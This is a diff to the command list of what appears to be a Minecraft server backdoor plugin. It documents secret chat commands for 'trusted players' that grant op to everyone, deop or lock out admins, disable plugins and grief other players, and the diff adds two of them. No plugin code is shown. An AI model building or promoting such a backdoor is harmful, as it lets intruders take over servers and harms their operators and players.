@@ -50,8 +50,6 @@ Example: ban 15w30x
 
 +#op Gives op Everyone (works only on luckperms. you can edit the code if you want to add others)
 
-# This commands only works if you are added to trusted players list except "+supremecheats+"
-
 # Fun
 
 !deop (name) deops the writen player.
@@ -66,8 +64,14 @@ Example: ban 15w30x
 
 !lock players or ops cant use commands.
 
+!disable (plugin) deactivates the writen plugin.
+
+!spikebomb gives you a spike bomb.
+
 !kontrolcubugu 15 blocks will bring everyone around you to their knees xD
 
 !deactivate Makes you non-trusted player
 
-# You can edit the code the way you want.
+# These commands only works if you are added to trusted players.
+
+## You can edit the code the way you want.
